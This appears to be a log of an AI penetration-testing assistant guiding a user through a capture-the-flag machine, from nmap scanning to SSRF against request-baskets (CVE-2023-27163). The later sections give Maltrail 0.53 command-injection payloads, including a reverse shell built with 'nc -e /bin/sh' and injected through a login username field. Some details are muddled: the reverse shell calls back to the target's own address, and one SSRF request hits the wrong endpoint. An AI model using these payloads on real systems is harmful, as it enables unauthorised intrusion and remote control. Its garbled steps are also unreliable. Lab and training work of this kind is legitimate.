* 2.2 Find the user flag.txt - [to-do]
* 3.1 Run linpeas and linenum - [to-do]
* 3.2 Find the root flag.txt - [to-do]

A favorable sub-task to perform is 1.3 Explore service and identify vulnerabilties. This task involves using manual techniques or tools like nmap scripting engine (NSE) to explore services running on the target machine and identify potential vulnerabilities. This is an important step in the penetration testing process, as it helps to identify potential entry points for exploitation.

To perform this task, first, use nmap to scan the target machine and identify the open ports and services. Then, use the nmap scripting engine (NSE) or manual techniques to explore the identified services and identify potential vulnerabilities.
--------------------------------------------------------------------------
user_prompt: User ran more command.
response: To expand the task "1.3 Explore service and identify vulnerabilities" into detailed steps, follow these instructions:

1. Use nmap to scan the target machine and identify the open ports and services.

```bash
nmap -sC -sV -oA nmap-output <target_IP>
```

* `-sC`: Use the default nmap scripts
* `-sV`: Attempt to determine the service/version info
* `-oA`: Output all formats (normal, grepable, and XML)
* `<target_IP>`: Replace with the IP address of the target machine

This command will perform a comprehensive scan, including service detection and script scanning, and save the results in three formats: normal, grepable, and XML.

1. Review the nmap output to identify the open ports and services.

```bash
cat nmap-output.gnmap
```

* `.gnmap` is the grepable output format

This command will display the nmap output in a human-readable format, allowing you to easily identify the open ports and services.

1. Use the nmap scripting engine (NSE) or manual techniques to explore the identified services and identify potential vulnerabilities.

Here's an example of using the NSE to scan for SSH vulnerabilities:

```bash
nmap --script=ssh-vuln* <target_IP>
```

* `--script=ssh-vuln*`: Run all SSH vulnerability detection scripts

This command will scan the target machine for any known vulnerabilities in the SSH service. You can use similar commands with different script names to scan for vulnerabilities in other services.

Alternatively, you can use manual techniques to explore the identified services and identify potential vulnerabilities. This may involve searching for known vulnerabilities in the specific software version or attempting to exploit common vulnerabilities such as weak passwords or misconfigurations.

Remember to keep track of your findings and document any vulnerabilities discovered during this process. This information will be useful for the next steps in the penetration testing process.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.76 seconds
response: Based on the nmap output, the target machine has the following open ports and services:

* 22/tcp: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
* 55555/tcp: An unrecognized service, which returns data when scanned

The tester has some questions and findings:

1. The SSH service is running on port 22, and the version is OpenSSH 8.2p1 Ubuntu 4ubuntu0.7. This information can be useful for identifying potential vulnerabilities in the SSH service.
2. The unrecognized service on port 55555 returns a 400 Bad Request HTTP response. This indicates that the service is likely an HTTP server, but it is not properly configured or is returning an error message.

To further explore the unrecognized service on port 55555, you can use the nmap scripting engine (NSE) or manual techniques. Here are some potential steps:

1. Use the nmap scripting engine (NSE) to scan for HTTP service vulnerabilities.

```bash
nmap --script=http-vuln* <target_IP>
```

* `--script=http-vuln*`: Run all HTTP vulnerability detection scripts
* `<target_IP>`: Replace with the IP address of the target machine

This command will scan the target machine for any known vulnerabilities in the HTTP service. You can use similar commands with different script names to scan for vulnerabilities in other services.

1. Use manual techniques to explore the unrecognized service on port 55555.

Here's an example of using the curl command to send a GET request to the service:

```bash
curl http://<target_IP>:55555
```

* `<target_IP>`: Replace with the IP address of the target machine

This command will send a GET request to the unrecognized service and display the response. You can use similar commands with different HTTP methods (e.g., POST, PUT, DELETE) to explore the service further.

Remember to keep track of your findings and document any vulnerabilities discovered during this process. This information will be useful for the next steps in the penetration testing process.
--------------------------------------------------------------------------
user_prompt: Discuss | Using the curl command the following output was given:
<a href="/web">Found</a>.
response: Based on the output from the curl command, the unrecognized service on port 55555 appears to be a simple HTTP server that returns a redirect response to the "/web" URL. To further explore the service, you can perform the following steps:

1. Use the curl command to send a GET request to the "/web" URL.

```bash
curl http://<target_IP>:55555/web
```

* `<target_IP>`: Replace with the IP address of the target machine

This command will send a GET request to the "/web" URL and display the response. If the service returns a different response, it may indicate that the service requires authentication or that it is a more complex application.

1. Use the curl command to send a POST request to the "/web" URL with some sample data.

```bash
curl -d 'sample_data' http://<target_IP>:55555/web
```

* `<target_IP>`: Replace with the IP address of the target machine
* `sample_data`: Replace with some sample data to test the service

This command will send a POST request to the "/web" URL with the provided sample data and display the response. This can help you determine if the service accepts POST requests and how it processes the data.

1. Use the curl command to send a DELETE request to the "/web" URL.

```bash
curl -X DELETE http://<target_IP>:55555/web
```

* `<target_IP>`: Replace with the IP address of the target machine

This command will send a DELETE request to the "/web" URL and display the response. This can help you determine if the service supports the DELETE method and how it handles the request.

Remember to keep track of your findings and document any vulnerabilities discovered during this process. This information will be useful for the next steps in the penetration testing process.

user_prompt: User ran more command.
response: To expand the task "2.1.1.1 Exploit CVE-2023-27163" into detailed steps, follow these instructions:

1. Use the nmap scripting engine (NSE) to scan the target machine and identify the open ports and services.

```bash
nmap -sC -sV -oA nmap-output <target_IP>
```

* `-sC`: Use the default nmap scripts
* `-sV`: Attempt to determine the service/version info
* `-oA`: Output all formats (normal, grepable, and XML)
* `<target_IP>`: Replace with the IP address of the target machine

This command will perform a comprehensive scan, including service detection and script scanning, and save the results in three formats: normal, grepable, and XML.

1. Review the nmap output to identify the open ports and services.

```bash
cat nmap-output.gnmap
```

* `.gnmap` is the grepable output format

This command will display the nmap output in a human-readable format, allowing you to easily identify the open ports and services.

1. Use the nmap scripting engine (NSE) to explore the identified services and identify potential vulnerabilities.

Here's an example of using the NSE to scan for SSH vulnerabilities:

```bash
nmap --script=ssh-vuln* <target_IP>
```

* `--script=ssh-vuln*`: Run all SSH vulnerability detection scripts
* `<target_IP>`: Replace with the IP address of the target machine

This command will scan the target machine for any known vulnerabilities in the SSH service. You can use similar commands with different script names to scan for vulnerabilities in other services.

1. Once the SSRF vulnerability (CVE-2023-27163) is identified in the request-baskets v1.2.1 service on port 55555, craft an API request that exploits this vulnerability to access network resources and sensitive information.

Here's an example of crafting an API request to exploit the SSRF vulnerability:

```bash
curl -X POST -d '{"method":"GET", "url":"http://example.com"}' http://<target_IP>:55555/baskets/search
```

* `-X POST`: Use the POST method
* `-d`: Provide data for the POST request
* `"method":"GET", "url":"http://example.com"`: Specify the API request to exploit the SSRF vulnerability
* `http://<target_IP>:55555/baskets/search`: Replace with the URL of the request-baskets service on the target machine

This command will send a POST request to the request-baskets service, exploiting the SSRF vulnerability to access the "example.com" website. You can modify the API request to access other network resources and sensitive information.

Remember to keep track of your findings and document any vulnerabilities discovered during this process. This information will be useful for the next steps in the penetration testing process.

user_prompt: User ran more command.
response: Based on the provided information, the tester has discovered a Server-Side Request Forgery (SSRF) vulnerability (CVE-2023-27163) in the request-baskets service on port 55555. The attack vector for the SSRF is a POST /api/baskets/{name} API request with a specific payload.

To exploit this vulnerability, the following steps can be taken:

1. Use the nmap scripting engine (NSE) to explore the identified services and identify potential vulnerabilities.
2. Once the SSRF vulnerability is identified, craft an API request that exploits this vulnerability to access network resources and sensitive information.

Here's an example of crafting an API request to exploit the SSRF vulnerability:

```bash
curl -X POST -d '{"forward_url": "http://example.com","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}' http://<target_IP>:55555/api/baskets/search
```

* `-X POST`: Use the POST method
* `-d`: Provide data for the POST request
* `"forward_url": "http://example.com","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}`: Specify the API request to exploit the SSRF vulnerability
* `http://<target_IP>:55555/api/baskets/search`: Replace with the URL of the request-baskets service on the target machine

This command will send a POST request to the request-baskets service, exploiting the SSRF vulnerability to access the "example.com" website. You can modify the API request to access other network resources and sensitive information.

Remember to keep track of your findings and document any vulnerabilities discovered during this process. This information will be useful for the next steps in the penetration testing process.

As the system has implemented Retrieval-augmented generation (RAG) which does a similarity search on the user prompt to a local dataset, the output of the similarity search is:

user_prompt: Discuss | The maltrail version 0.53 is vulnerable to Unauthenticated OS Command Injection
The Proof-of-Concept is:
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
Explain how I can exploit this to gain a shell on 'http://10.129.20.170:55555/test'
response: To exploit the Unauthenticated OS Command Injection vulnerability in Maltrail v0.53 and gain a shell on `http://10.129.20.170:55555/test`, follow these steps:

1. Send a POST request to the Maltrail web service with the payload `;`id > /tmp/bbq`"`. This payload will execute the "id" command and redirect its output to the file `/tmp/bbq`.

Here's an example of crafting an API request to exploit the Unauthenticated OS Command Injection vulnerability:

```bash
curl -X POST -d 'username=;`id > /tmp/bbq`' http://10.129.20.170:55555/test/login
```

* `-X POST`: Use the POST method
* `-d`: Provide data for the POST request
* `username=;`id > /tmp/bbq`"`: Specify the payload to exploit the Unauthenticated OS Command Injection vulnerability
* `http://10.129.20.170:55555/test/login`: Replace with the URL of the Maltrail web service on the target machine

This command will send a POST request to the Maltrail web service, exploiting the Unauthenticated OS Command Injection vulnerability to execute the "id" command and redirect its output to the file `/tmp/bbq`.

1. Check if the file `/tmp/bbq` has been created and contains the output of the "id" command.

```bash
curl -X GET http://10.129.20.170:55555/test/bbq
```

* `-X GET`: Use the GET method
* `http://10.129.20.170:55555/test/bbq`: Replace with the URL of the Maltrail web service on the target machine

This command will send a GET request to the Maltrail web service, retrieving the contents of the file `/tmp/bbq`.

1. If the file `/tmp/bbq` contains the output of the "id" command, proceed to the next step to gain a shell on the target machine.

To gain a shell on the target machine, you can use the netcat (nc) utility to create a reverse shell. First, start a netcat listener on your local machine:

```bash
nc -lvnp 4444
```

* `-l`: Listen for incoming connections
* `-v`: Enable verbose mode
* `-n`: Do not resolve hostnames
* `-p`: Specify the local port to listen on

1. Send a POST request to the Maltrail web service with the payload `;`nc -e /bin/sh 10.129.20.170 4444`"`. This payload will create a reverse shell by executing the "nc -e /bin/sh 10.129.20.170 4444" command on the target machine and redirecting its output to your local machine.

Here's an example of crafting an API request to exploit the Unauthenticated OS Command Injection vulnerability and create a reverse shell:

```bash
curl -X POST -d 'username=;`nc -e /bin/sh 10.129.20.170 4444`' http://10.129.20.170:55555/test/login
```

* `-X POST`: Use the POST method
* `-d`: Provide data for the POST request
* `username=;`nc -e /bin/sh 10.129.20.170 4444`"`: Specify the payload to exploit the Unauthenticated OS Command Injection vulnerability and create a reverse shell
* `http://10.129.20.170:55555/test/login`: Replace with the URL of the Maltrail web service on the target machine

This command will send a POST request to the Maltrail web service, exploiting the Unauthenticated OS Command Injection vulnerability to create a reverse shell on the target machine.

1. Once the reverse shell is established, you can interact with the target machine using the netcat listener on your local machine.

Remember to keep track of your findings and document any vulnerabilities discovered during this process. This information will be useful for the next steps in the penetration testing process.
